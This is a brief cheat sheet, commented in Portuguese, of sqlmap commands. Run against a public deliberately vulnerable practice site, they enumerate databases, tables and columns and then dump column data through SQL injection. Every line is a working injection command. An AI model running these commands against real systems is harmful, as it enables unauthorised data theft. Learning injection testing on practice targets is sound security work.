sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs # lista os bancos de dados

sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D database_name --tables # lista as tabelas de 'database_name'

sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D databse_name -T table_name --columns # Lista as colunas da tabela 'table_name'

sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D databse_name -T table_name -C column_name --dump # Lista os dados da coluna 'column_name'